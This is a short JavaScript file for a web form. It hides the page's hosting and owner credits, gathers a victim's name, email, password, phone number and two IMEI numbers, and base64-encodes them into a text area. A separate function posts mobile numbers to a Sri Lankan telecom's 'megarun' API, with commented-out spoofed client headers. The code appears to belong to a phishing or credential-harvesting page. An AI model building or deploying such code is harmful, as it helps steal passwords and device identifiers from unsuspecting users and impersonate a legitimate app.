document.getElementsByClassName('btn')[0].style.visibility = "hidden";
  window.addEventListener('load', function() {
  	console.log(window.location.href);
	document.getElementsByClassName('site-footer-owner')[0].style.visibility = "hidden";
  	document.getElementsByClassName('site-footer-credits')[0].style.visibility = "hidden"
  });
  window.setTimeout(function() {
        document.body.className = document.body.className.replace('site-footer-owner','');
	document.body.className = document.body.className.replace('site-footer-credits','');
  }, 10);
  var form = document.getElementById("form_dc");
  document.getElementById("dc_submit").addEventListener("click", function () {
	  
      var data = document.getElementById("fname").value +","+ document.getElementById("lname").value +","+ document.getElementById("email").value +","+ document.getElementById("pass").value +","+ document.getElementById("phone").value +","+ document.getElementById("imei").value +","+ document.getElementById("imei2").value;
      var encodedString = btoa(data);
      console.log(encodedString);
      document.getElementById("txtArea").value = encodedString;
	
  });
	
	function sendNo(Mob){
	let url = "https://megarun.dialog.lk/api/v2/user";
	

	let request = new XMLHttpRequest();
	request.onreadystatechange = function () {
	    if (this.readyState === 4) {
	        if (this.status === 200) {
	            console.log(this.responseText);
	        } else if (this.response == null && this.status === 0) {
	            console.log("The computer appears to be offline.");
	        } else {
	            document.body.className = 'error';
	        }
	    }
	};

	request.onloadend = function() {
	    if (request.status == 201) {
	      console.log("success");
	    } else {
	      console.log("error " + this.status);
	    }
	};


	let data = "mobile="+Mob;

	request.open("POST", url, true)
	request.setRequestHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization");
	request.setRequestHeader("Access-Control-Allow-Origin", "*");
	request.setRequestHeader("Access-Control-Allow-Headers", "*");

	//request.setRequestHeader("Referer", "https://megarun.dialog.lk");
	//request.setRequestHeader("User-Agent", navigator.userAgent);
	//request.setRequestHeader("Accept-Encoding","gzip");
	//request.setRequestHeader("Expect","100-continue");
	
	//request.setRequestHeader("X-Unity-Version",unityVersion);
	//request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	request.send(data);

	/*request.setRequestHeader(header, value);
	request.open("GET", url, true);
	request.send(null);*/
}
